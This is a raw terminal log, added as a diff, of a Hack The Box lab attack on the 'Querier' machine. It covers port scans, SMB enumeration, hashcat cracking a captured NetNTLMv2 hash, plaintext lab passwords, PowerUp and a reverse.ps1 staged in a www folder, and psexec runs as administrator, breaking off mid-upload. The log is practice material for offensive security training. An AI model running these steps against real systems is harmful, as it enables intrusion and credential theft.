@@ -1,0 +1,588 @@
+┌─[root@parrot]─[~]            
+└──╼ #ifconfig                 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500    
+        inet 10.0.2.8  netmask 255.255.255.0  broadcast 10.0.2.255                   
+        inet6 fe80::ed96:d3ba:685a:109f  prefixlen 64  scopeid 0x20<link>            
+        ether 08:00:27:29:cf:e4  txqueuelen 1000  (Ethernet)  
+        RX packets 399  bytes 335601 (327.7 KiB)              
+        RX errors 0  dropped 0  overruns 0  frame 0           
+        TX packets 483  bytes 54103 (52.8 KiB)                
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500    
+        ether 08:00:27:64:55:18  txqueuelen 1000  (Ethernet)  
+        RX packets 27  bytes 10438 (10.1 KiB)                 
+        RX errors 0  dropped 0  overruns 0  frame 0           
+        TX packets 21  bytes 2587 (2.5 KiB)                   
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                  
+        inet 127.0.0.1  netmask 255.0.0.0                     
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>          
+        loop  txqueuelen 1000  (Local Loopback)               
+        RX packets 22  bytes 942 (942.0 B)                    
+        RX errors 0  dropped 0  overruns 0  frame 0           
+        TX packets 22  bytes 942 (942.0 B)                    
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500                   
+        inet 10.10.14.11  netmask 255.255.254.0  destination 10.10.14.11             
+        inet6 fe80::f453:a06e:32d4:3b92  prefixlen 64  scopeid 0x20<link>            
+        inet6 dead:beef:2::1009  prefixlen 64  scopeid 0x0<global>                   
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
+        RX packets 0  bytes 0 (0.0 B)                         
+        RX errors 0  dropped 0  overruns 0  frame 0           
+        TX packets 3  bytes 144 (144.0 B)                     
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                   
+
+┌─[root@parrot]─[~]            
+└──╼ #cd hackthebox/querrier/  
+┌─[root@parrot]─[~/hackthebox/querrier]                       
+└──╼ #nmap -sC -sV -oA nmap/querier 10.10.10.125              
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 22:06 EST                      
+Nmap scan report for 10.10.10.125                             
+Host is up (0.39s latency).    
+Not shown: 996 closed ports    
+PORT     STATE SERVICE       VERSION                          
+135/tcp  open  msrpc         Microsoft Windows RPC            
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn    
+445/tcp  open  microsoft-ds?   
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM            
+| ms-sql-ntlm-info:            
+|   Target_Name: HTB           
+|   NetBIOS_Domain_Name: HTB   
+|   NetBIOS_Computer_Name: QUERIER                            
+|   DNS_Domain_Name: HTB.LOCAL 
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL                      
+|   DNS_Tree_Name: HTB.LOCAL   
+|_  Product_Version: 10.0.17763                               
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback      
+| Not valid before: 2019-12-23T16:52:52                       
+|_Not valid after:  2049-12-23T16:52:52                       
+|_ssl-date: 2019-12-24T03:08:48+00:00; +1m01s from scanner time.                     
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows      
+
+Host script results:           
+|_clock-skew: mean: 1m00s, deviation: 0s, median: 1m00s       
+| ms-sql-info:                 
+|   10.10.10.125:1433:         
+|     Version:                 
+|       name: Microsoft SQL Server 2017 RTM                   
+|       number: 14.00.1000.00  
+|       Product: Microsoft SQL Server 2017                    
+|       Service pack level: RTM                               
+|       Post-SP patches applied: false                        
+|_    TCP port: 1433           
+| smb2-security-mode:          
+|   2.02:                      
+|_    Message signing enabled but not required                
+| smb2-time:                   
+|   date: 2019-12-24T03:08:42  
+|_  start_date: N/A            
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.10 seconds  
+┌─[root@parrot]─[~/hackthebox/querrier]                       
+└──╼ #smbmap -H 10.10.10.125 -u anonymous                                        
+[+] Finding open SMB ports....          
+[!] Authentication error on 10.10.10.125                                         
+[!] Authentication error on 10.10.10.125                                         
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #smbmap -H 10.10.10.125 -u anonymous -d localhost                           
+[+] Finding open SMB ports....          
+[+] Guest SMB session established on 10.10.10.125...                             
+[+] IP: 10.10.10.125:445        Name: 10.10.10.125                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        .                                                                        
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown     
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass            
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs           
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc           
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-33c-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper         
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1cc-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service  
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog         
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-3f0-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc            
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-484-0
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc           
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-260-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss          
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-4c0-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks           
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc           
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service   
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-5fc-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER           
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT      
+        fr--r--r--                6 Sun Dec 31 19:03:58 1600    SQLLocal\MSSQLSERVER
+        fr--r--r--                2 Sun Dec 31 19:03:58 1600    sql\query        
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-250-0
+        IPC$                                                    READ ONLY       Remote IPC
+        .                                                                        
+        dr--r--r--                0 Mon Jan 28 18:26:31 2019    .                
+        dr--r--r--                0 Mon Jan 28 18:26:31 2019    ..               
+        fr--r--r--            12229 Mon Jan 28 18:26:31 2019    Currency Volume Report.xlsm
+        Reports                                                 READ ONLY        
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #smbclient -N //10.10.10.125/IPC$  
+Try "help" to get a list of possible commands.                                   
+smb: \> dir                             
+NT_STATUS_INVALID_INFO_CLASS listing \* 
+smb: \> mget*                           
+mget*: command not found                
+smb: \> mget *                          
+NT_STATUS_INVALID_INFO_CLASS listing \* 
+smb: \> recurse ON                      
+smb: \> mget *                          
+NT_STATUS_INVALID_INFO_CLASS listing \* 
+smb: \> exit                            
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #mkdir smb                         
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #ls                                
+'Currency Volume Report.xlsm'   nmap   smb                                       
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #mv 'Currency Volume Report.xlsm' smb/                                      
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #ls                                
+nmap  smb                               
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cd nmap/                          
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cat allports.nmap | grep ^[0-9] | awk -F /'{print $1} | sort -u > ports    
+>                                       
+> ^C                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier/nmap]                                 
+└──╼ #cat allports.nmap | grep ^[0-9] | awk -f /'{print $1} | sort -u > ports                                                                                     
+> ^C                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier/nmap]                                 
+└──╼ #cat allports.nmap                 
+# Nmap 7.80 scan initiated Mon Dec 23 22:11:54 2019 as: nmap -p- -oA nmap/allports -vvv 10.10.10.125
+Increasing send delay for 10.10.10.125 from 0 to 5 due to 531 out of 1769 dropped probes since last increase.
+Nmap scan report for 10.10.10.125       
+Host is up, received echo-reply ttl 127 (0.18s latency).                         
+Scanned at 2019-12-23 22:11:54 EST for 937s                                      
+Not shown: 65521 closed ports           
+Reason: 65521 resets                    
+PORT      STATE SERVICE      REASON     
+135/tcp   open  msrpc        syn-ack ttl 127                                     
+139/tcp   open  netbios-ssn  syn-ack ttl 127                                     
+445/tcp   open  microsoft-ds syn-ack ttl 127                                     
+1433/tcp  open  ms-sql-s     syn-ack ttl 127                                     
+5985/tcp  open  wsman        syn-ack ttl 127                                     
+47001/tcp open  winrm        syn-ack ttl 127                                     
+49664/tcp open  unknown      syn-ack ttl 127                                     
+49665/tcp open  unknown      syn-ack ttl 127                                     
+49666/tcp open  unknown      syn-ack ttl 127                                     
+49667/tcp open  unknown      syn-ack ttl 127                                     
+49668/tcp open  unknown      syn-ack ttl 127                                     
+49669/tcp open  unknown      syn-ack ttl 127                                     
+49670/tcp open  unknown      syn-ack ttl 127                                     
+49671/tcp open  unknown      syn-ack ttl 127                                     
+
+Read data files from: /usr/bin/../share/nmap                                     
+# Nmap done at Mon Dec 23 22:27:31 2019 -- 1 IP address (1 host up) scanned in 937.62 seconds
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cat allports.nmap | grep ^[0-9]   
+135/tcp   open  msrpc        syn-ack ttl 127                                     
+139/tcp   open  netbios-ssn  syn-ack ttl 127                                     
+445/tcp   open  microsoft-ds syn-ack ttl 127                                     
+1433/tcp  open  ms-sql-s     syn-ack ttl 127                                     
+5985/tcp  open  wsman        syn-ack ttl 127                                     
+47001/tcp open  winrm        syn-ack ttl 127                                     
+49664/tcp open  unknown      syn-ack ttl 127                                     
+49665/tcp open  unknown      syn-ack ttl 127                                     
+49666/tcp open  unknown      syn-ack ttl 127                                     
+49667/tcp open  unknown      syn-ack ttl 127                                     
+49668/tcp open  unknown      syn-ack ttl 127                                     
+49669/tcp open  unknown      syn-ack ttl 127                                     
+49670/tcp open  unknown      syn-ack ttl 127                                     
+49671/tcp open  unknown      syn-ack ttl 127                                     
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1} |sort =u             
+> cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}                          
+awk: cmd. line:1: {print $1} |sort =u   
+awk: cmd. line:1:            ^ syntax error                                      
+awk: cmd. line:2: cat allports.nmap | grep ^[0-9] | awk -F/ {print               
+awk: cmd. line:2:             ^ syntax error                                     
+awk: cmd. line:2: cat allports.nmap | grep ^[0-9] | awk -F/ {print               
+awk: cmd. line:2:                               ^ syntax error                   
+awk: cmd. line:2: cat allports.nmap | grep ^[0-9] | awk -F/ {print               
+awk: cmd. line:2:                                           ^ syntax error       
+awk: cmd. line:2: cat allports.nmap | grep ^[0-9] | awk -F/ {print               
+awk: cmd. line:2:                                                 ^ unexpected newline or end of string
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier/nmap]                                 
+└──╼ #cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1} |sort -s             
+> ^C                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier/nmap]                                 
+└──╼ #cat allports.nmap | grep ^[0-9] | awk -F/ '{print $1}                      
+> ^C                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier/nmap]                                 
+└──╼ #cat allports.nmap | grep ^[0-9] | sort -u                                  
+135/tcp   open  msrpc        syn-ack ttl 127                                     
+139/tcp   open  netbios-ssn  syn-ack ttl 127                                     
+1433/tcp  open  ms-sql-s     syn-ack ttl 127                                     
+445/tcp   open  microsoft-ds syn-ack ttl 127                                     
+47001/tcp open  winrm        syn-ack ttl 127                                     
+49664/tcp open  unknown      syn-ack ttl 127                                     
+49665/tcp open  unknown      syn-ack ttl 127                                     
+49666/tcp open  unknown      syn-ack ttl 127                                     
+49667/tcp open  unknown      syn-ack ttl 127                                     
+49668/tcp open  unknown      syn-ack ttl 127                                     
+49669/tcp open  unknown      syn-ack ttl 127                                     
+49670/tcp open  unknown      syn-ack ttl 127                                     
+49671/tcp open  unknown      syn-ack ttl 127                                     
+5985/tcp  open  wsman        syn-ack ttl 127                                     
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cat allports.nmap | grep ^[0-9] | sort -u | awk -F/ '{print $1}'                                                                                            
+135                                     
+139                                     
+1433                                    
+445                                     
+47001                                   
+49664                                   
+49665                                   
+49666                                   
+49667                                   
+49668                                   
+49669                                   
+49670                                   
+49671                                   
+5985                                    
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cat allports.nmap | grep ^[0-9] | sort -u | awk -F/ '{print $1}' > ports   
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #for  i in $(cat ports); do echo -n $i ;done                                
+13513914334454700149664496654966649667496684966949670496715985┌─[root@parrot]─[~/hackthebox/querrier/nmap]
+└──╼ #for  i in $(cat ports); do echo -h $i ;done                                                                                                                 
+-h 135                                  
+-h 139                                  
+-h 1433                                 
+-h 445                                  
+-h 47001                                
+-h 49664                                
+-h 49665                                
+-h 49666                                
+-h 49667                                
+-h 49668                                
+-h 49669                                
+-h 49670                                
+-h 49671                                
+-h 5985                                 
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #for  i in $(cat ports); do echo -n $i, ;done                                                                                                                
+135,139,1433,445,47001,49664,49665,49666,49667,49668,49669,49670,49671,5985,┌─[root@parrot]─[~/hackthebox/querrier/nmap]
+└──╼ #nmap -sC -sV -p 135,139,1433,445,47001,49664,49665,49666,49667,49668,49669,49670,49671,5985 -oA scripts -allports 10.10.10.125
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 22:41 EST                  
+Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan       
+NSE Timing: About 99.95% done; ETC: 22:42 (0:00:00 remaining)                    
+Nmap scan report for 10.10.10.125       
+Host is up (0.40s latency).             
+
+PORT      STATE SERVICE       VERSION   
+135/tcp   open  msrpc         Microsoft Windows RPC                              
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                      
+445/tcp   open  microsoft-ds?           
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM       
+| ms-sql-ntlm-info:                     
+|   Target_Name: HTB                    
+|   NetBIOS_Domain_Name: HTB            
+|   NetBIOS_Computer_Name: QUERIER      
+|   DNS_Domain_Name: HTB.LOCAL          
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL                                         
+|   DNS_Tree_Name: HTB.LOCAL            
+|_  Product_Version: 10.0.17763         
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                         
+| Not valid before: 2019-12-23T16:52:52 
+|_Not valid after:  2049-12-23T16:52:52 
+|_ssl-date: 2019-12-24T03:43:29+00:00; +1m00s from scanner time.                 
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)            
+|_http-server-header: Microsoft-HTTPAPI/2.0                                      
+|_http-title: Not Found                 
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)            
+|_http-server-header: Microsoft-HTTPAPI/2.0                                      
+|_http-title: Not Found                 
+49664/tcp open  msrpc         Microsoft Windows RPC                              
+49665/tcp open  msrpc         Microsoft Windows RPC                              
+49666/tcp open  msrpc         Microsoft Windows RPC                              
+49667/tcp open  msrpc         Microsoft Windows RPC                              
+49668/tcp open  msrpc         Microsoft Windows RPC                              
+49669/tcp open  msrpc         Microsoft Windows RPC                              
+49670/tcp open  msrpc         Microsoft Windows RPC                              
+49671/tcp open  msrpc         Microsoft Windows RPC                              
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                         
+
+Host script results:                    
+|_clock-skew: mean: 1m00s, deviation: 0s, median: 59s                            
+| ms-sql-info:                          
+|   10.10.10.125:1433:                  
+|     Version:                          
+|       name: Microsoft SQL Server 2017 RTM                                      
+|       number: 14.00.1000.00           
+|       Product: Microsoft SQL Server 2017                                       
+|       Service pack level: RTM         
+|       Post-SP patches applied: false  
+|_    TCP port: 1433                    
+| smb2-security-mode:                   
+|   2.02:                               
+|_    Message signing enabled but not required                                   
+| smb2-time:                            
+|   date: 2019-12-24T03:43:21           
+|_  start_date: N/A                     
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.51 seconds                     
+┌─[root@parrot]─[~/hackthebox/querrier/nmap]                                     
+└──╼ #cd ..                             
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #vi creds                          
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cat creds                         
+usernmae : reporting                    
+password : PcwTWTHRwryjc$c6             
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #vi creds                                                                                                                                                  
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cat creds                         
+usernmae : reporting                    
+password : PcwTWTHRwryjc$c6"            
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #vi mssql_hash                     
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #hashcat -m 5600 mssql_hash /opt/wordlists/rockyou.txt --force                                                                                               
+hashcat (v5.1.0) starting...            
+
+OpenCL Platform #1: The pocl project    
+====================================    
+* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts                              
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates     
+Rules: 1                                
+
+Applicable optimizers:                  
+* Zero-Byte                             
+* Not-Iterated                          
+* Single-Hash                           
+* Single-Salt                           
+
+Minimum password length supported by kernel: 0                                   
+Maximum password length supported by kernel: 256                                 
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.                           
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.    
+
+Watchdog: Hardware monitoring interface not found on your system.                
+Watchdog: Temperature abort trigger disabled.                                    
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=5600 -D _unroll'
+* Device #1: Kernel m05600_a0-pure.cc96d5c7.kernel not found in cache! Building may take a while...
+Dictionary cache hit:                   
+* Filename..: /opt/wordlists/rockyou.txt                                         
+* Passwords.: 14344384                  
+* Bytes.....: 139921497                 
+* Keyspace..: 14344384                  
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s                               
+
+Session..........: hashcat              
+Status...........: Running              
+Hash.Type........: NetNTLMv2            
+Hash.Target......: MSSQL-SVC::QUERIER:8fd09487701ff99c:051f13e29654fc7...000000  
+Time.Started.....: Mon Dec 23 23:02:37 2019 (21 secs)                            
+Time.Estimated...: Mon Dec 23 23:04:58 2019 (2 mins, 0 secs)                     
+Guess.Base.......: File (/opt/wordlists/rockyou.txt)                             
+Guess.Queue......: 1/1 (100.00%)        
+Speed.#1.........:   101.4 kH/s (8.03ms) @ Accel:512 Loops:1 Thr:1 Vec:8         
+Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts                        
+Progress.........: 2108416/14344384 (14.70%)                                     
+Rejected.........: 0/2108416 (0.00%)    
+Restore.Point....: 2108416/14344384 (14.70%)                                     
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                            
+Candidates.#1....: NOKAS -> NANOOK      
+
+MSSQL-SVC::QUERIER:8fd09487701ff99c:051f13e29654fc75b6fb1777808960a0:0101000000000000c0653150de09d201787758b76687f335000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000746f9fb1f738cfc9c79ca13671988a457bc9bf478f3be0392859c168add2ddea0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:corporate568
+                                                                                 
+Session..........: hashcat              
+Status...........: Cracked              
+Hash.Type........: NetNTLMv2            
+Hash.Target......: MSSQL-SVC::QUERIER:8fd09487701ff99c:051f13e29654fc7...000000  
+Time.Started.....: Mon Dec 23 23:02:37 2019 (1 min, 36 secs)                     
+Time.Estimated...: Mon Dec 23 23:04:13 2019 (0 secs)                             
+Guess.Base.......: File (/opt/wordlists/rockyou.txt)                             
+Guess.Queue......: 1/1 (100.00%)        
+Speed.#1.........:    85458 H/s (10.43ms) @ Accel:512 Loops:1 Thr:1 Vec:8        
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                    
+Progress.........: 8958976/14344384 (62.46%)                                     
+Rejected.........: 0/8958976 (0.00%)    
+Restore.Point....: 8957952/14344384 (62.45%)                                     
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                            
+Candidates.#1....: correios -> coroladoa                                         
+
+Started: Mon Dec 23 23:01:52 2019       
+Stopped: Mon Dec 23 23:04:14 2019       
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #vi creds                          
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cat creds                         
+usernmae : reporting                    
+password : PcwTWTHRwryjc$c6             
+
+username : mssql_svc                    
+passowrd: corporate568                  
+
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #rlwrap                            
+-bash: rlwrap: command not found        
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                      
+└──╼ #apt-get install wrap              
+Reading package lists... Done           
+Building dependency tree                
+Reading state information... Done       
+
+No apt package "wrap", but there is a snap with that name.                       
+Try "snap install wrap"                 
+
+E: Unable to locate package wrap        
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                      
+└──╼ #apt-get install rlwrap            
+Reading package lists... Done           
+Building dependency tree                
+Reading state information... Done       
+The following packages were automatically installed and are no longer required:  
+  ccze gir1.2-mate-panel gir1.2-nautilus-3.0 golang-1.12 golang-1.12-doc golang-1.12-go golang-1.12-src hcxtools highlight highlight-common hostapd-wpe
+  isc-dhcp-server libbladerf1 libboost-random1.67.0 libboost-timer1.67.0 libcrypto++6 libcupsimage2 libdvdread4 libegl1-mesa libevent-core-2.1-6
+  libevent-openssl-2.1-6 libevent-pthreads-2.1-6 libgeos-3.7.2 libgit2-27 libgnome-desktop-3-17 libgnuradio-audio3.7.13 libgnuradio-fcd3.7.13
+  libgnuradio-fcdproplus3.7.11 libgnuradio-iqbalance3.7.11 libgnuradio-uhd3.7.13 libhavege1 libhwloc5 libigdgmm9 libilmbase23 libirs-export161
+  libisccfg-export163 libisl19 libjim0.77 libjte1 liblimesuite18.06-1 liblinear3 liblouis17 libnfs12 libomp5-7 libopenexr23 liborcus-0.14-0 libpango-perl
+  libqpdf21 libqscintilla2-qt5-13 libsnmp30 libsoapysdr0.6 libstd-rust-1.37 libtss2-udev libuhd3.13.1 libvala-0.42-0 libvpx5 libwxgtk3.0-0v5 libx265-165
+  libx265-176 libxdot4 mdk4 policycoreutils python-easyprocess python-fuzzywuzzy python-geoip python-gpg python-ldap3 python-ldapdomaindump python-magic
+  python-nautilus python-pyqt5 python-pytesseract python-pyvirtualdisplay python-qt4reactor python-rsa python-slugify python-talloc python-xmlbuilder
+  selinux-utils soapyosmo-common0.6 soapysdr0.6-module-airspy soapysdr0.6-module-all soapysdr0.6-module-audio soapysdr0.6-module-bladerf
+  soapysdr0.6-module-hackrf soapysdr0.6-module-lms7 soapysdr0.6-module-osmosdr soapysdr0.6-module-redpitaya soapysdr0.6-module-remote soapysdr0.6-module-rtlsdr
+  soapysdr0.6-module-uhd valac-0.42-vapi                                         
+Use 'apt autoremove' to remove them.    
+The following NEW packages will be installed:                                    
+  rlwrap                                
+0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded.                   
+Need to get 98.3 kB of archives.        
+After this operation, 304 kB of additional disk space will be used.              
+Get:1 https://mirror.yandex.ru/mirrors/parrot rolling/main amd64 rlwrap amd64 0.43-1+b2 [98.3 kB]
+Fetched 98.3 kB in 8s (12.6 kB/s)       
+Selecting previously unselected package rlwrap.                                  
+(Reading database ... 518524 files and directories currently installed.)         
+Preparing to unpack .../rlwrap_0.43-1+b2_amd64.deb ...                           
+Unpacking rlwrap (0.43-1+b2) ...        
+Setting up rlwrap (0.43-1+b2) ...       
+update-alternatives: using /usr/bin/rlwrap to provide /usr/bin/readline-editor (readline-editor) in auto mode
+Processing triggers for man-db (2.9.0-1) ...                                     
+Scanning application launchers          
+Updating active launchers               
+Done                                    
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cd /opt/                          
+┌─[root@parrot]─[/opt]                  
+└──╼ #git clone https://github.com/PowerShellMafia/PowerSploit.git               
+Cloning into 'PowerSploit'...           
+remote: Enumerating objects: 3083, done.                                         
+remote: Total 3083 (delta 0), reused 0 (delta 0), pack-reused 3083               
+Receiving objects: 100% (3083/3083), 10.47 MiB | 257.00 KiB/s, done.             
+Resolving deltas: 100% (1807/1807), done.                                        
+┌─[root@parrot]─[/opt]                  
+└──╼ #ls                                
+BloodHound          firmware-mod-kit  JAWS               nishang      privilege-escalation-awesome-scripts-suite  Teeth         tmux-yank  wordlists
+BurpSuiteCommunity  gobuster          LinEnum.sh         passwords    PRTG-Network-Monitor-RCE                    tmux          Veil       xplico
+car-hacking         impacket          mRemoteNG-Decrypt  PowerSploit  SecLists                                    tmux-logging  wicd-git
+┌─[root@parrot]─[/opt]                  
+└──╼ #cd PowerSploit/                   
+┌─[root@parrot]─[/opt/PowerSploit]      
+└──╼ #ls                                
+AntivirusBypass  Exfiltration  Mayhem       PowerSploit.psd1  PowerSploit.pssproj  Privesc    Recon               Tests
+CodeExecution    LICENSE       Persistence  PowerSploit.psm1  PowerSploit.sln      README.md  ScriptModification
+┌─[root@parrot]─[/opt/PowerSploit]      
+└──╼ #cd Privesc/                       
+┌─[root@parrot]─[/opt/PowerSploit/Privesc]                                       
+└──╼ #ls                                
+Get-System.ps1  PowerUp.ps1  Privesc.psd1  Privesc.psm1  README.md               
+┌─[root@parrot]─[/opt/PowerSploit/Privesc]                                       
+└──╼ #cp PowerUp.ps1 ~/hackthebox/querrier/www/                                  
+┌─[root@parrot]─[/opt/PowerSploit/Privesc]                                       
+└──╼ #cd ~/hackthebox/querrier/www/     
+┌─[root@parrot]─[~/hackthebox/querrier/www]                                      
+└──╼ #ls                                
+PowerUp.ps1  reverse.ps1                
+┌─[root@parrot]─[~/hackthebox/querrier/www]                                      
+└──╼ #cd ..                             
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #cat creds                         
+usernmae : reporting                    
+password : PcwTWTHRwryjc$c6             
+
+username : mssql_svc                    
+passowrd: corporate568                  
+
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #ls  www/                                                                                                                                                   
+PowerUp.ps1  reverse.ps1                
+┌─[root@parrot]─[~/hackthebox/querrier] 
+└──╼ #pysexec.py administrator@10.10.10.125                                      
+-bash: pysexec.py: command not found    
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                      
+└──╼ #psexec.py administrator@10.10.10.125                                                                                                                       
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     
+
+Password:                               
+[*] Requesting shares on 10.10.10.125.....                                       
+[*] Found writable share ADMIN$         
+[*] Uploading file NqtRiktj.exe         
+^Z                  
+[1]+  Stopped                 psexec.py administrator@10.10.10.125               
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                      
+└──╼ #/opt/impacket/examples/psexec.py administrator@10.10.10.125                
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                     
+
+Password:           
+[*] Requesting shares on 10.10.10.125.....                                       
+[*] Found writable share ADMIN$         
+[*] Uploading file cJARbKUm.exe         
+^Z                  
+[2]+  Stopped                 /opt/impacket/examples/psexec.py administrator@10.10.10.125                 
+┌─[✗]─[root@parrot]─[~/hackthebox/querrier]                                          
+└──╼ #/usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.125  
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation                         
+
+Password:            
+[*] Requesting shares on 10.10.10.125.....                                           
+[*] Found writable share ADMIN$           
